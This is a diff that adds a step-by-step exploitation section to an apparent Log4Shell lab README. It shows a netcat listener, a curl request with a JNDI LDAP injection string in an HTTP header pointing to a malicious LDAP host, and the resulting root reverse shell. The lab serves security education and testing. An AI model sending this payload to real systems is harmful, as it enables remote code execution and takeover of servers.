@@ -42,6 +42,41 @@ chmod +x configurar.sh
 
 ---
 
+
+🚀 How to Exploit (Step-by-Step)
+
+Once the infrastructure is automatically up and running via the script, follow these steps to trigger the exploit and capture the reverse shell.
+Step 1: Set Up the Netcat Listener
+
+Open a new terminal on your host machine (Ubuntu) and attach to the attacker's container to put Netcat on standby for incoming connections:
+Bash
+
+sudo docker exec -it kali-tools bash
+
+Inside the Kali container, start the listener:
+Bash
+
+nc -lvnp 4444
+
+You will see the message: listening on [any] 4444 ...
+Step 2: Launch the Attack Vector
+
+Open another separate terminal on your host machine and send the malicious JNDI injection string embedded within the X-Api-Version header:
+Bash
+
+curl http://localhost:8080/ -H 'X-Api-Version: ${jndi:ldap://ldap-malicioso:1389/Exploit}'
+
+Step 3: Verify the Reverse Shell
+
+Go back to your Netcat terminal. You should see an active connection. You can now execute commands as root inside the victim server:
+Bash
+
+connect to [172.21.0.4] from (UNKNOWN) [172.21.0.2] 57164
+whoami
+root
+
+---
+
 ## ⚠️ Disclaimer
 
 This repository is created strictly for **educational purposes, security research, and authorized academic auditing**. Never execute these tools or attack infrastructure without explicit, prior written authorization from the infrastructure owners.
